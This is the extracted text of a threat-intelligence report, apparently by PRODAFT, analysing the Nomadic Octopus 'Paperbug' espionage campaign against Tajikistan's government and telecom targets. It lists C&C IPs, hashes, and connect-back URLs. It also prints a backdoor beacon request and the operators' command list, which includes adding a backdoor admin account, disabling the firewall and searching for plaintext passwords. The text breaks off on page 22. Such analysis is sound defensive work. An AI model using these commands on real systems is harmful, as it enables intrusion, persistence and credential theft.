{
    "id": "6ad67605-2f4b-48ca-a124-266641f9610d",
    "created_at": "2023-05-01T02:06:23.40857Z",
    "updated_at": "2025-03-27T02:17:11.195167Z",
    "deleted_at": null,
    "sha1_hash": "db6501cd0f8af28ed165dff83617ec5d6d372114",
    "title": "",
    "authors": "",
    "file_creation_date": "2023-04-24T13:07:50Z",
    "file_modification_date": "2023-04-24T13:07:50Z",
    "file_size": 4730635,
    "plain_text": "# Nomadic Octopus’ Paperbug Campaign\n\n\n-----\n\n### Contents\n\n**References** **2**\n\n**1** **Glossary** **3**\n\n**2** **Introduction** **3**\n\n**3** **Executive Summary** **4**\n3.1 Overview . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4\n3.2 Characteristics of the Paperbug Operation . . . . . . . . . . . . . . . . . . . . . . 4\n\n**4** **Technical Analysis** **6**\n4.1 Impact . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6\n4.2 Backdoor Analysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 6\n4.2.1 Comparison with Older Samples . . . . . . . . . . . . . . . . . . . . . . . . . 7\n4.2.2 Found Octopus Variation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11\n4.3 C&C Analysis . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 15\n4.4 Operator Behaviour . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19\n4.5 De-Anonymization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25\n\n**5** **Statistics & Observations** **25**\n5.1 Interested Profiles . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29\n5.2 Other Targets In Scope . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 30\n\n**6** **Appreciations** **31**\n6.1 Preventing Another Paperbug . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32\n\n**7** **TTP** **33**\n\n**8** **IOC** **38**\n8.1 C&C Servers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\n8.2 Threat Actor Related IPs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\n8.3 Backdoors . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\n8.4 Cobalt Strike . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 38\n\n2 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nproviding any legally applicable warranty regarding completeness or accuracy of the contents Therefore neither this report\n\n\n-----\n\n|Reference Number|CH-2021031001|\n|---|---|\n|Prepared By|PTI Team|\n|Investigation Date|15.10.2021 - 01.01.2022|\n|Initial Report Date|18.01.2022|\n|Last Update|14.04.2023|\n\n\n### 1 Glossary\n\nWe have chosen to include a glossary in this report to prevent confusion around the names\n**Octopus, Nomadic Octopus, Dustsquad and Paperbug. Throughout this report, we chose to**\nrefer to Nomadic Octopus, alternatively referred to as DustSquad, as the group behind the\noperation Octopus, which was a cyber espionage campaign targeting Kazakhstan, using\nthe malware called Octopus. Paperbug, on the other hand, is the new campaign of Nomadic\n**Octopus that we are covering in this report.**\n\n### 2 Introduction\n\nEspionage is the act of obtaining secret or confidential information from a closed\nsource without the consent of the holder, or disseminating it without the consent of the\nholder. Cyber espionage is one of the sophisticated types of this act. They are mostly\nheld to gather sensitive digital documents and closed sources of governments and\ncorporations. In order to get this information, the group must gain access to their target’s\nnetworks, devices, or infrastructures. The infiltration can be done with spear-phishing target\ngovernment/corporate individuals[1], exploiting public services of the organization[7] and\nmore. These operations are usually carried out by government actors, state sponsored or\ndirected groups to obtain intelligence on their targets and enhance their own nation’s safety\nand military capability.\n\nThis report explores an operational environment which is owned by Nomadic Octopus\nespionage group, that has been active since 2020. According to victim analysis, the\ngroup specifically targets Tajikistan’s high ranking government officials, telecommunication\nservices, and public service infrastructures. The types of compromised machines range\nfrom individuals’ computers to OT devices. These targets make operation ”Paperbug”\nintelligence-driven. The environment itself is built with fundamental functionality. This makes\nthe attribution challenging; it leaves little room for comments. However, in this case, the\nfindings were sufficient to profile this group.\n\n\nPlease note that this report has two versions. The ”Private Release” is provided to law\nenforcement agencies, applicable CERTS / CSIRTS, and members of our U.S.T.A. Threat\nIntel Platform (with appropriate annotations and reductions). Likewise, the ”Public\n_Release” is publicly disseminated for the purpose of advancing global fight against_\nhigh-end threat actors and APTs such as Nomadic Octopus.\n\n\n3 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\nThere is no available public sources or report about the Paperbug operation. This is likely the\nfirst operation that Nomadic Octopus has organized since Octopus[9]. Due to the actor’s\ntool choices being too generic and no original tools being used, making inferences with\nother known campaigns is not an option. This report focuses on new information like how\nNomadic Octopus group operates through their victims’ networks and devices, as well as\nhow the Octopus Malware works and compares the samples obtained in this research with\nit. This report also contains valuable, previously unreported samples and findings from the\nPaperbug’s operational environment.\n\n### 3 Executive Summary\n\nThe Executive Summary section of this report offers a non-technical outline of the\n**Paperbug Campaign, its targets, and its organizational structure.**\n\n#### 3.1 Overview\n\nAccording to unearthed victim data, Tajikistan is the ultimate target of this operation.\nThe target list includes but is not limited to Tajikistan’s government officials, public\nservice infrastructures and the telecom provider . The initial step that led to the\ncompromising of other victims very likely was the infiltration of the network, even\nthough the initial access time to and how it was infiltrated is uncertain. This is also\nsupported by the order of victim contributions to the operation panel; the group has gained\naccess telecommunication firm network and its employees firstly. This then led to\nthe group carrying out lateral movement on at least 18 ultimate targets (deleted victims\n_are not counted), largely focusing on government networks, executives’ and OT devices_\nwith publicly known vulnerabilities, while also performing deep reconnaissance of\nnetworks, customers, and affiliates. According to the frequency of screenshots being taken\nby Nomadic Octopus especially while targeted victims were writing e-mails and creating\nnew contracts of their customers, the group spied on devices and took their notes diligently.\n\nOperation PaperBug aligns with the common trend of attacking into central asia government\ninfrastructure that recently became more prominent. This trend can also be seen in other\nRussian speaking state-sponsored threat actors like Sofacy[8]. They have also been observed\nattacking telecommunication infrastructure in central asian regions, including Tajikistan. This\nindicates that there might be some ties between the main subject of this report Nomadic\n**Octopus and other prominent espionage groups like Sofacy.**\n\n#### 3.2 Characteristics of the Paperbug Operation\n\n**Politically-Motivated Surveillance : According to PTI Team’s analysis of Nomadic Octopus’**\nbehavior, they tend to infiltrate wherever the group can access to without much discrimination.\nHowever, they then go through the acquired devices and only keep the victims that are\nvaluable in terms of surveillance and political gains. The group tends to remove their\naccess if the victim is not related with public services or government infrastructures.\nAlso, it is observed that operators steal e-mails, documents in compromised devices\nand instant messaging apps’ chat history periodically to leak potentially sensitive information.\n\n4 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n**Targets Central Asia Government Officials : According to the PTI Team’s victim analysis,**\nmost Paperbug victims have governmental connections. A few of the individuals that were\ncompromised were successfully identified by the PTI team, and it was confirmed that\nthey are government officials in Central Asia. Moreover, the group writes notes about the\ncompromised devices and their possible owners, the notes appear to be in Russian. These\nnotes, alongside more information, can be found in Figure 23.\n\n**Targets Telecom Companies : The aspect setting this operation apart from other operation**\nconducted in Central Asia is the method it uses to compromise its victims. The starting\npoint of this operation is the compromisation of the networks of a Tajikistan based telecom\ncompany, . The first victim machine on the C&C server was also a device in\nthe network. This idea is also supported by the domain name used for the\noperation : **.** . Moreover, most of the compromised IPs are from the\nIP block. Unfortunately, the point of initial access to the network is unclear. It is\ndetermined that Paperbug operation started in this firm’s network then expanded their\naccess through document theft, stolen clients’ contracts and credentials, weak network\nsecurity configurations and exploitation of not up-to-date software and services.\n\n**Targets OT Devices : OT device connections are also kept by the Nomadic Octopus team.**\nWhen a team member analyzes a compromised machine and decides on its value, they\ncategorize the machine as one of the types of victims that they are interested in. If it does\nnot fit into any of the categories, the machine is then removed from the system. The PTI\nTeam has observed that even though they are placed under a more generic category, the\nNomadic Octopus operators chose to keep the victims used for operational technology.\n\n**Not Stealthy on Victim Devices : Despite the high stakes of the operation and the levels**\nof government that the group is dealing with, there have been several cases where\nthe operators failed to stay stealthy in the compromised systems. As they operate on\nthe compromised machines to steal information, they sometimes inadvertently caused\npermission pop-ups on victim computers, which resulted in suspicion from the victim.\nHowever, this was resolved due to the group diligently naming the files they transfer as\nbenign and inconspicuous programs.\n\n**Connections to other campaigns targeting Central Asia : Even though this report covers on**\nonly two domains used for running the operation. The PTI Team has also observed other\ndomains that are likely to be related. This indicates there is possibly more to this campaign.\nMoreover, the increase in attacks to the Central Asia by state sponsored Russian-speaking\nthreat actors[8] combined with the espionage nature of this case as well as the highly\norganized behavior of the Nomadic Octopus operators indicate the group’s possible\nconnections to other state sponsored threat actors.\n\n5 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n### 4 Technical Analysis\n\nThis section analyzes the Nomadic Octopus group’s C&C infrastructure and the\ntechnology being used for Paperbug operation.\n\n#### 4.1 Impact\n\nNomadic Octopus used multiple servers to manage and operate the used backdoors\nand tools in the Paperbug campaign, Table 1 lists the IPs of the servers Nomadic Octopus has\nbeen observed using. We have also run into the evidence that another suspicious domain,\n**kolimans.info was used. However, this domain’s relation to operation PaperBug cannot be**\ndetermined with high confidence, and thus is not covered in this report.\n\n**IP Address** **ISP** **First Seen**\n94.140.114.20 Sia Nano IT 18-03-2021\n44.227.76.166 Amazon.com, Inc 22-09-2020\n44.227.65.245 Amazon.com, Inc 19-09-2020\n91.219.238.239 ServerAstra Kft. 16-05-2020\n91.208.184.79 Alexhost Srl 01-04-2021\n54.36.185.101 OVH SAS 19-09-2020\n199.188.200.245 Namecheap, Inc. 01-04-2021\n194.180.174.154 MivoCloud SRL 18-03-2021\n185.32.126.102 FSIT AG 18-03-2021\n\n**Table 1. Nomadic Octopus managed IPs and ISPs**\n\n#### 4.2 Backdoor Analysis\n\nIn this section, we will analyze and compare the malware that Nomadic Octopus has\nbeen observed using previously and the malware used in operation PaperBug. The hashes\nfor the files we are comparing can be found on Table 2\n\n**Type** **Md5 Checksum**\nOctopus 62fb5aa21f62e92586829520078c2561\nPaperbug 2c7f334360054e7245f26fe64936914f\n\n**Table 2. Hashes of the samples used for analysis**\n\nBack in 2018, Octopus Malware appeared, masquerading as an application used to send\nbatch messages on Telegram [1]. It is written in Delphi language. Figure 1 displays app layout\nof Octopus Malware.\n\n1. Most public sources[9] regarding Nomadic Octopus misclassify it by stating it is a Telegram client that\nbypasses the Kazakh restrictions.\n\n6 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n|IP Address|ISP|First Seen|\n|---|---|---|\n|94.140.114.20|Sia Nano IT|18-03-2021|\n|44.227.76.166|Amazon.com, Inc|22-09-2020|\n|44.227.65.245|Amazon.com, Inc|19-09-2020|\n|91.219.238.239|ServerAstra Kft.|16-05-2020|\n|91.208.184.79|Alexhost Srl|01-04-2021|\n|54.36.185.101|OVH SAS|19-09-2020|\n|199.188.200.245|Namecheap, Inc.|01-04-2021|\n|194.180.174.154|MivoCloud SRL|18-03-2021|\n|185.32.126.102|FSIT AG|18-03-2021|\n\n|Type|Md5 Checksum|\n|---|---|\n|Octopus|62fb5aa21f62e92586829520078c2561|\n|Paperbug|2c7f334360054e7245f26fe64936914f|\n\n\n-----\n\n**Figure 1. Layout of the octopus malware**\n\nCore features of Octopus Malware are listed below.\n\n## • [Checking real IP address of the target system]\n • [Sending system information of the target system to the command and control server]\n • [Taking screenshot of the target system]\n • [Dumping Windows system credentials using][ fgdump][ program]\n\n**4.2.1** **Comparison with Older Samples**\n\nMalware found on the command and control server, is very closely similar with the publicly\nknown and before seen Octopus malware’s network module. Similarities in the code can be\nseen in the Figure 2 .\n\n**Figure 2. Code similarity**\n\n7 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\nThere are similarities in used strings used in samples. String similarity is shown in Figure 3.\n\n**Figure 3. String similarity**\n\nEverything seems to be same with the Octopus malware’s network module except the\ncommunication technique and website used as an upload service. The new sample sends\ndata in XML format using HTTP POST requests while Octopus malware’s network module was\nusing HTTP GET requests without XML parsing. Example requests are shown in Figure 4.\n\n**Figure 4. Network Request**\n\n8 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\nUpload service website is changed on new samples. Code snippet to upload files are given\nin the Figure 5.\n\n**Figure 5. Upload service website**\n\nVersion strings in the samples are the same in both Octopus malware’s network module and\nanalyzed samples. Code snippet to create version strings given in the Figure 6.\n\n**Figure 6. Version strings**\n\n9 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\nAccording to timestamp of samples, they are compiled in 2020. Compile timestamps are\ngiven in the Figure 7.\n\n**Figure 7. Compile timestamps**\n\n10 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n**4.2.2** **Found Octopus Variation**\n\nThese are the icons in-use by the newer malware. This icon choices are made by the\nlocation of which malware is planted.\n\n**Figure 8. Malware icons**\n\nThis variant is also developed with Delphi language, and its size is roughly 3 MB. Payloads\nand strings are plain, no anti static-analysis technique is implemented.\n\n**Figure 9. Malware Type**\n\n11 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\nAfter the initialization part of the executable’s entry, backdoor determines which reporting\nand connect back URL will be used. Table 3 shows all connect back URLs. lovingearthy.com\ndomain has not been observed by the PTI team, however it is still included because one\nVirusTotal report[10] shows that the binary tried to connect to this domain. However, it is\nnot found in any samples that served in C&C panel. Even analyzed sample has no data\nindicating that this domain exists.\n\n**URLs**\nhttp://islandsnake.com/pulse.php\nhttp://footcoinball.com/class.php\nhttp://lovingearthy.com/disks.php\n\n**Table 3. Found Octopus Connect Back URLs**\n\nExecutable tries to find which connect back is available in the defined server list. Then\nchoose one and send a POST request that states it is ready to deploy the connection. An\nexample request is given below;\n```\nPOST /class.php HTTP/1.0\nConnection: keep-alive\nContent-Type: multipart/form-data; boundary=--------012522163850983\nContent-Length: 209\nHost: footcoinball.com\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nUser-Agent: ce868a7a5b7ee61091088f6033f81031\n----------012522163850983\nContent-Disposition: form-data; name=\"check\"\nContent-Type: text/plain\nContent-Transfer-Encoding: quoted-printable\nce868a7a5b7ee61091088f6033f81031\n----------012522163850983-\n```\nInitialization will continue with FUN_005d9c1c (as shown in Figure 10), which will collect\ninformation about the device. To clarify more, these explained steps and commands\nexecuted remotely are called queries. Also it drops a file named profile.ini in the %TEMP%\ndirectory.\n\n12 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n**Figure 10. 005d9c1c function continues**\n\n13 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n**COLLECT_INFORMATION function collects the all information that are also displayed in the**\nC&C (as shown in Figure 14). This function uses an executable called wmic.exe to enumerate.\nAppropriate headers and the output are concatenated appropriately and the overall output\nis sent to the connect-back server via the function FUN_005d9c1c. Used parameters with\n**wmic.exe given below.**\n\n**Query** **Purpose**\n**WMIC.exe computersystem get Name /format:list** Computer Name\n**WMIC.exe os get installdate /format:list** Installation date of Windows\n**WMIC.exe path CIM_LogicalDiskBasedOnPartition get** Gets Disk Partition List\n**Antecedent, Dependent**\n\n**WMIC.exe** **path** **win32_physicalmedia** **where** Get Serial Number of Physical\n**tag=PHYSICALDRIVE0 get serialnumber /format:list** Disk\n\n**Table 4. WMIC Enumeration**\n\nLastly, this backdoor has three main functions, which are; taking screenshots, running\ncommands remotely and download/upload files. Download/Upload functionality is also\nexplained more thoroughly in Section 4.4, also the section has an example output of this\nfunctionality. fuploadnow.com is used for exfiltrating chosen files. Backdoor uses WinRar to\nzip the chosen directories, then upload them to this domain.\n\n14 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n|Query|Purpose|\n|---|---|\n|WMIC.exe computersystem get Name /format:list|Computer Name|\n|WMIC.exe os get installdate /format:list|Installation date of Windows|\n|WMIC.exe path CIM_LogicalDiskBasedOnPartition get Antecedent, Dependent|Gets Disk Partition List|\n|WMIC.exe path win32_physicalmedia where tag=PHYSICALDRIVE0 get serialnumber /format:list|Get Serial Number of Physical Disk|\n\n\n-----\n\n#### 4.3 C&C Analysis\n\nThe C&C panel has a pragmatic, minimalist design. News tab is the welcome page of\nthis command and control panel. In this tab, users can add topics to inform others. The last\nand only topic is added at 01 March 2021 07:44 GMT, it refers to the backdoors which are\nOctopus Malware download links. The only subject that distinguishes them is that their icons\nare different. They are being placed at different directories, whichever icon matches the\ncontext. Hashes provided at Section 8.3.\n\n**Figure 11. Welcome page, displaying the news.**\n\n**List bot tab shows all active backdoors, also these established connections, separated**\nby their context. In Figure 12, displayed not sorted victims are unknown victims that are\nstill waiting to be analyzed by threat actors. It is observed that actors may discard the\nconnection if the target is not in the scope of their interests. (for ex : not government, not\n_interested country)_\n\n**Figure 12. Compromised devices displayed in the operational environment**\n\n15 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n**494 ID is the server which is owned by** explained in Section 5. The other records\nare out of context. The creation times and last response times are the same, these records\ncould be someone works on public samples or threat actor might have run for itself.\n_(One of the backdoors is uploaded to VirusTotal by someone already_ [2])\n\nFollowing Table 5 shows the context of other groups (explained in detail at Section 5);\n\n**Tab Name** **Context**\n**25.1** Government network\nAccording to taken screenshot analysis, They are\noperators/engineers/servers.\n**-Clients** They are customers of, threat actors actively seek and\nanalyze operator devices to see the customers details, generally\nthey take screenshots of the contract paper of customers. Threat\nactors will decide after if the new client can be profitable in terms\nof intel. Actors either discard the client connection or keep the\nclient for further steps.\n\n**Table 5. Groups in the operational environment.**\n\nIn the Information tab, users can run commands via cmd.exe and powershell.exe. Moreover,\nthe outputs and states of tasks are supplied to the users. The functionality in this tab\nid provided by the backdoor itself. The backdoor can download/upload files and take\nscreenshots. The files are later uploaded to fuploadnow.com.\n\n**Figure 13. Operational environment allows for remotely executing commands**\n\n[2. https://www.virustotal.com/gui/file/2c7f334360054e7245f26fe64936914f](https://www.virustotal.com/gui/file/2c7f334360054e7245f26fe64936914f)\n\n16 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n|Tab Name|Context|\n|---|---|\n|25.1|Government network|\n||According to taken screenshot analysis, They are operators/engineers/servers.|\n|-Clients|They are customers of , threat actors actively seek and analyze operator devices to see the customers details, generally they take screenshots of the contract paper of customers. Threat actors will decide after if the new client can be profitable in terms of intel. Actors either discard the client connection or keep the client for further steps.|\n\n\n-----\n\nUsers can get brief information about the compromised device in Information tab, which\nincludes :\n\n## • [Identifier of the victim]\n • [Computer name]\n • [Username]\n • [Internal address]\n • [Remote address]\n • [Version of the backdoor]\n • [Connect back address]\n • [The directory that backdoor is planted]\n • [Connected disks and their sizes finally]\n • [Task history]\n\n**Figure 14. Victim information as displayed on the operational environment**\n\n17 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\nThis view (as shown in below) will be opened up when the Open button of tasks in the\n**Information tab is clicked. This view will yield output of an executed command as well as the**\n**date of when it is executed, its status of whether if it is done, failed or still running.**\n\n**Figure 15. Operational environment executing a command in victim machine**\n\nFinally, the last Settings tab is also shown in Figure 18. It does not have much functionality. This\ntab allows the addition of a new user with provided credentials and self password change,\nand displays already existing users.\n\n18 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n#### 4.4 Operator Behaviour\n\nDespite the high-profile targets and mission the group has, the organization has no\nadvanced skills on behalf of development and tooling. The group brings nothing new to the\ntable on top of other advanced persistent groups’ techniques. In this operation, Operators\nuse mostly public offensive tools and according to Prodaft Threat Intelligence (PTI) Team’s\nobservations, the operators run commands and download their tools on victim devices\ninattentively (especially in the victim’s active hours), even the operator itself checks if its\nexistence is noticed or if the victim suspects something is wrong. On the other hand, the\nusage of public tools, generic techniques and their penetration tester like behaviour almost\nact as a cloak for the group. The non-exclusivity of their actions makes the attribution step\nvery challenging.\n\nOne thing that the attacker does better is the placing of their tools into commonly unchecked\ndirectories and inconspicuously naming them. Seen examples are :\n\n1. Google Update\n2. Chrome Update\n3. Java Update\n4. Google Crash Handler\n\nFigure 16 displays the moment in which the operators take a screenshot. Before this\nscreenshot, the operator tried to run a recently downloaded tool. After its failure, the\noperator took this screenshot from the C&C panel to learn why it did not work.\n\n**Figure 16. Operator tries to run newly downloaded tool (failed)**\n\n19 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\nThis imbalance between the operator skills and importance of the mission might indicate\nthat the operators have been recruited by some entity which provided them a list of\ncommands that need to be executed on each machine exactly. This is further supported\nby the obstinate behavior of, trying to execute some commands even though it is clear\nbeforehand that they will fail, thus meaning that the operator follows a checklist and forced\nto stick to it.\n\nMost of the time, the tools in-use require firewall permissions or additional privileges. To\nnot attract the victim’s suspicion, the operator names the in-use tools into more generic\nprograms that are suitable for the privilege. For example; if tool needs network permissions\nto work, the operator might name it as ChromeUpdate.exe[16].\n\nAccording to PTI Team’s observations, sometimes if the preferred tool fails, the operator tries\nalternatives. However, with the frustration of not being able to make it work, sometimes they\nforget to change the name of the executables, thus being noticed by the victim. Figure 17\nis an instance of this where the victim suspects there is something wrong. The screenshots\nwere taken by the Nomadic Octopus operators and were found in the command and control\npanel history.\n\n**Figure 17. Attempt to run frp, named as proxy.exe**\n\n20 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\nTable 6 and 7 shows all of masqueraded and used directories and software products.\n\nC:\\spoolerlogs\\\nC:\\intel\\\nC:\\Users\\Username\\\nC:\\Users\\Username\\Appdata\\Roaming \\Microsoft\nC:\\RECYCLER\nC:\\Logs\nAdobe, Intel, Java, Firefox, Chrome, The-Bat! Default Directories\n\n**Table 6. Masqueraded Directories**\n\nGoogleUpdate.exe\nChromeUpdate.exe\nlssas.exe\nGoogleCrashHandler.exe\nJavaUpdate.exe\nJavaRM.exe\nSpooler.exe\nsvhast.exe\nGoogle Chrome Browser\nMozilla Firefox Browser\nYandex Browser\nThe-Bat! E-mail Client\n(Service) Diagnostic Service Host\n(Service) MSOffice\n(Startup) HP LaserJet Pro\n\n**Table 7. Masqueraded Software Names and Executables**\n\n21 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\nAccording to executed command history found in command and control panel, the operator\nfollowed a decided path when a victim device is overtaken. The following list has the\nenumeration techniques and other information gathering steps taken on the compromised\ndevices.\n\n1. cmd.exe /c (systeminfo 2>&1)\nWindows’ built-in command to check the system configuration.\n2. cmd.exe /c (netstat 2>&1)\nDisplays active TCP connections, ports on which the computer is listening, Ethernet\nstatistics, the IP routing table, IPv4 statistics (for the IP, ICMP, TCP, and UDP protocols),\nand IPv6 statistics. [3]\n3. cmd.exe /c (dir C:\\users\\2>&1))\nDisplays users directory\n4. cmd.exe /c (dir C:\\Users\\USER\\Desktop 2>&1)\nRuns for all detected users to find valuable documents.\n5. cmd.exe /c (dir C:\\RECYCLER 2>&1)\nEnumerates recycle bin.\n6. cmd.exe /c (dir C:\\Temp 2>&1)\nEnumerates temporary files and directory.\n7. cmd.exe /c (dir C:\\Users\\USER\\Downloads 2>&1)\nEnumerates downloaded files.\n8. cmd.exe /c (net users 2>&1)\nEnumerates users on the compromised device.\n9. cmd.exe /c (reg query ”HKEY_CURRENT_USER\\...\\Internet Settings” 2>&1))\nGets Internet connection configuration.\n10. cmd.exe /c (whoami /priv 2>&1)\nDisplays user, group and privileges information for the user who is currently logged on\nto the local system. [5]\n11. cmd.exe /c (net localgroup administrators 2>&1)\nDisplays local administrator users on compromised device.\n12. cmd.exe /c (net user Admin Passw0rd /add 2>&1))\nAdds a backdoor local user if it has enough privileges.\n13. cmd.exe /c (tasklist 2>&1)\nDisplays a list of currently running processes on the local computer or on a remote\ncomputer.[4]\n14. wmic qfe get Caption,Description,HotFixID,InstalledOn 2>&1\nDisplay installed patches on the compromised device.\n15. cmd.exe /c (netsh advfirewall set allprofiles state off 2>&1)\nSet firewall off if the user has enough privileges\n16. cmd.exe /c (cd C : & findstr /SI /M ”password” *.xml *.ini *.txt 2>&1)\nSearches for plain-text passwords.\n17. cmd.exe /c (C:\\Users\\USER\\nbt.exe 10.154.0.0/16 2>&1)\nThis is a command-line tool that scans for open NETBIOS nameservers on a local or\nremote TCP/IP network, and this is a first step in finding of open shares. It is based on\nthe functionality of the standard Windows tool nbtstat, but it operates on a range of\naddresses instead of just one.[11]\n\n22 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 